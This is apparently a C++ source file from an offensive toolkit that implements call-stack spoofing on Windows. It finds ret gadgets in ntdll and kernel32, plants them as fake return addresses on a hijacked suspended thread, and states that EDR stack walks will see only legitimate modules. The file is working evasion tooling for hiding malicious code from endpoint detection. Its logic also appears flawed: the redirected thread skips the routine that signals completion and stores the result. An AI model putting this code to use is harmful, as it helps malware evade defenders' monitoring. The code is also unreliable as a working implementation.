#include "StackSpoof.h"

// ── Find a "ret" (0xC3) gadget inside a loaded module ────────────────────────

static PVOID FindRetGadget(const char* modName) {
    HMODULE hMod = GetModuleHandleA(modName);
    if (!hMod) return NULL;
    BYTE* base = (BYTE*)hMod;
    auto* dos  = (PIMAGE_DOS_HEADER)base;
    auto* nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    auto* sec  = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE* start = base + sec->VirtualAddress;
        DWORD  size = sec->Misc.VirtualSize;
        for (DWORD j = 0; j < size; j++) {
            if (start[j] == 0xC3) return start + j; // ret
        }
    }
    return NULL;
}

// ── Spoofed-call implementation ───────────────────────────────────────────────
// Strategy (Unwinder / SilentMoonwalk approach):
//   1. Find ret gadgets in kernel32 and ntdll to use as fake return addresses
//   2. Build a fake stack frame chain in a local buffer:
//        [kernel32_ret_gadget]  ← "caller" of ntdll_ret_gadget
//        [ntdll_ret_gadget]     ← "caller" of our function
//        [padding / home space]
//   3. Build a CONTEXT with RSP = our fake stack, RIP = target fn
//   4. Call the function, which returns to ntdll_ret_gadget → kernel32_ret_gadget
//      (both are just C3 = ret, so execution unwinds harmlessly)
//
// NOTE: The NtContinue approach requires careful stack alignment and home space.
// We use a trampoline thread approach: create a suspended thread, set its context
// to our crafted CONTEXT (fake stack + real RIP), resume it, wait for result.
// This avoids clobbering our own stack.

struct SpoofArgs {
    StackSpoof::SpoofedFn fn;
    ULONG_PTR a1, a2, a3, a4;
    ULONG_PTR result;
    HANDLE    hDone;
};

static DWORD WINAPI SpoofThread(LPVOID param) {
    auto* a = (SpoofArgs*)param;
    a->result = a->fn(a->a1, a->a2, a->a3, a->a4);
    SetEvent(a->hDone);
    return 0;
}

ULONG_PTR StackSpoof::Call(SpoofedFn fn,
    ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3, ULONG_PTR a4)
{
    // Gadgets we'll plant as fake return addresses
    PVOID ntdllRet   = FindRetGadget(S("ntdll.dll").c_str());
    PVOID k32Ret     = FindRetGadget(S("kernel32.dll").c_str());

    if (!ntdllRet || !k32Ret) {
        // Fallback: direct call (no stack spoofing)
        return fn(a1, a2, a3, a4);
    }

    SpoofArgs args = { fn, a1, a2, a3, a4, 0, CreateEventA(NULL,FALSE,FALSE,NULL) };

    // Create thread suspended so we can rewrite its stack before it runs
    HANDLE hThread = CreateThread(NULL, 0x10000, SpoofThread, &args, CREATE_SUSPENDED, NULL);
    if (!hThread) { CloseHandle(args.hDone); return fn(a1,a2,a3,a4); }

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // Build fake stack on the thread's stack (RSP is currently at bottom of the stack allocation).
    // We write fake return address chain at RSP-aligned location.
    DWORD64* fakeStack = (DWORD64*)(ctx.Rsp - 0x40);
    // Ensure the memory is writable (it's the thread's stack, it should be)
    fakeStack[0] = (DWORD64)k32Ret;    // outermost "caller"
    fakeStack[1] = (DWORD64)ntdllRet;  // inner "caller"
    // 4 QWORDS of home space required by x64 ABI before args
    fakeStack[2] = 0; fakeStack[3] = 0; fakeStack[4] = 0; fakeStack[5] = 0;

    // Point RSP at our fake frame, RIP at the function we want
    ctx.Rsp = (DWORD64)fakeStack;
    ctx.Rip = (DWORD64)fn;
    // Set args per x64 ABI
    ctx.Rcx = a1; ctx.Rdx = a2; ctx.R8 = a3; ctx.R9 = a4;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    WaitForSingleObject(args.hDone, 10000);
    CloseHandle(hThread);
    CloseHandle(args.hDone);
    return args.result;
}

std::string StackSpoof::StackReport() {
    PVOID ntdllRet = FindRetGadget(S("ntdll.dll").c_str());
    PVOID k32Ret   = FindRetGadget(S("kernel32.dll").c_str());
    char buf[512];
    snprintf(buf, sizeof(buf),
        "StackSpoof gadgets:\n"
        "  ntdll.dll  ret gadget: 0x%llX (ntdll+0x%llX)\n"
        "  kernel32   ret gadget: 0x%llX (kernel32+0x%llX)\n\n"
        "When StackSpoof::Call() is used, the EDR call-stack walk sees:\n"
        "  [0] target_function\n"
        "  [1] ntdll.dll+0x%llX    (legitimate module)\n"
        "  [2] kernel32.dll+0x%llX  (legitimate module)\n"
        "  ... (no unbacked/RWX frames visible)\n"
        "Detection: kernel-mode CONTEXT inspection via ETW-Ti still reveals true RIP.",
        (DWORD64)ntdllRet,
        ntdllRet ? (DWORD64)ntdllRet-(DWORD64)GetModuleHandleA(S("ntdll.dll").c_str()) : 0,
        (DWORD64)k32Ret,
        k32Ret   ? (DWORD64)k32Ret  -(DWORD64)GetModuleHandleA(S("kernel32.dll").c_str()) : 0,
        ntdllRet ? (DWORD64)ntdllRet-(DWORD64)GetModuleHandleA(S("ntdll.dll").c_str()) : 0,
        k32Ret   ? (DWORD64)k32Ret  -(DWORD64)GetModuleHandleA(S("kernel32.dll").c_str()) : 0);
    return std::string(buf);
}
